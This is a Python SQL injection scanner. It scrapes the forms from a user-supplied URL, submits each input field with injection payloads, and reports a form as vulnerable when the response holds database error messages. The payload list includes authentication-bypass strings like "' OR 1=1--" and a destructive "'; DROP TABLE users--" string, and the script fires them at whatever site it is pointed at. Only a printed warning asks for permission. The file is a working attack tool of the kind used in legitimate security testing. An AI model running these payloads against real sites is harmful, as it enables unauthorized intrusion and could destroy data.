import requests
from bs4 import BeautifulSoup
import sys
from urllib.parse import urljoin
import time

# Initialize session with headers
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"

# Extended SQL injection payloads
SQL_INJECTION_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "'; DROP TABLE users--",
    "1' OR '1'='1",
]

def get_forms(url):
    """Retrieve all forms from a given URL"""
    try:
        response = s.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error fetching {url}: {e}")
        return []

def form_details(form, base_url):
    """Extract form details including action, method, and inputs"""
    detailsOfForm = {}
    action = form.attrs.get("action", "")
    # Resolve relative URLs to absolute URLs
    action = urljoin(base_url, action) if action else base_url
    method = form.attrs.get("method", "get").lower()
    inputs = []
    
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({
            "type": input_type, 
            "name": input_name,
            "value": input_value,
        })
    
    # Also check for textarea and select elements
    for textarea in form.find_all("textarea"):
        textarea_name = textarea.attrs.get("name")
        inputs.append({
            "type": "textarea",
            "name": textarea_name,
            "value": "",
        })
    
    for select in form.find_all("select"):
        select_name = select.attrs.get("name")
        inputs.append({
            "type": "select",
            "name": select_name,
            "value": "",
        })
        
    detailsOfForm['action'] = action
    detailsOfForm['method'] = method
    detailsOfForm['inputs'] = inputs
    return detailsOfForm

def vulnerable(response):
    """Check if response contains SQL error messages"""
    errors = {
        "quoted string not properly terminated", 
        "unclosed quotation mark after the character string",
        "you have an error in your sql syntax",
        "warning: mysql",
        "mysqlclient.",
        "postgresql",
        "driver",
        "sql syntax",
        "syntax error",
        "unterminated quoted string",
        "ora-01756",
        "sql command not properly ended",
        "sqlite3::",
        "sqlstate",
        "mysql_fetch",
        "pg_query",
        "odbc_exec",
    }
    
    try:
        content = response.content.decode(errors='ignore').lower()
        for error in errors:
            if error in content:
                return True
    except Exception as e:
        print(f"[!] Error checking response: {e}")
    
    return False

def sql_injection_scan(url):
    """Scan a URL for SQL injection vulnerabilities"""
    print(f"[*] Starting SQL injection scan on: {url}\n")
    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.\n")
    
    if not forms:
        print("[!] No forms found. Scan complete.")
        return
    
    total_vulnerabilities = 0
    
    for form_index, form in enumerate(forms, 1):
        details = form_details(form, url)
        print(f"[*] Testing form #{form_index}")
        print(f"    Action: {details['action']}")
        print(f"    Method: {details['method'].upper()}")
        print(f"    Inputs: {len(details['inputs'])}")
        
        form_vulnerable = False
        
        for payload in SQL_INJECTION_PAYLOADS:
            data = {}
            
            for input_tag in details["inputs"]:
                input_name = input_tag.get("name")
                input_type = input_tag.get("type", "text")
                
                # Skip if input has no name
                if not input_name:
                    continue
                
                # Keep hidden and submit values as is, inject payload in other fields
                if input_type in ["hidden", "submit"]:
                    data[input_name] = input_tag.get("value", "")
                else:
                    data[input_name] = f"test{payload}"
            
            # Skip if no data to send
            if not data:
                continue
            
            try:
                # Submit the form with injected payload
                if details["method"] == "post":
                    res = s.post(details['action'], data=data, timeout=10)
                else:  # GET
                    res = s.get(details['action'], params=data, timeout=10)
                
                # Check if vulnerable
                if vulnerable(res):
                    print(f"\n[!] SQL INJECTION VULNERABILITY DETECTED!")
                    print(f"    URL: {details['action']}")
                    print(f"    Method: {details['method'].upper()}")
                    print(f"    Payload: {payload}\n")
                    form_vulnerable = True
                    total_vulnerabilities += 1
                    break  # Stop testing this form once vulnerability is found
                
                # Small delay to avoid overwhelming the server
                time.sleep(0.5)
                
            except requests.exceptions.Timeout:
                print(f"[!] Timeout testing form with payload '{payload}'")
                continue
            except requests.exceptions.RequestException as e:
                print(f"[!] Error testing form with payload '{payload}': {e}")
                continue
        
        if not form_vulnerable:
            print(f"    [✓] No vulnerabilities detected in form #{form_index}\n")
    
    print("[*] Scan complete.")
    print(f"[*] Total vulnerabilities found: {total_vulnerabilities}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        urlToBeChecked = sys.argv[1]
    else:
        urlToBeChecked = input("Enter URL to scan: ").strip()
    
    # Validate URL
    if not urlToBeChecked.startswith(('http://', 'https://')):
        urlToBeChecked = 'https://' + urlToBeChecked
    
    print("\n" + "="*60)
    print("SQL INJECTION VULNERABILITY SCANNER")
    print("="*60 + "\n")
    print("⚠️  WARNING: Only test websites you own or have permission to test!")
    print("    Unauthorized testing may be illegal.\n")
    print("="*60 + "\n")
    
    try:
        sql_injection_scan(urlToBeChecked)
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)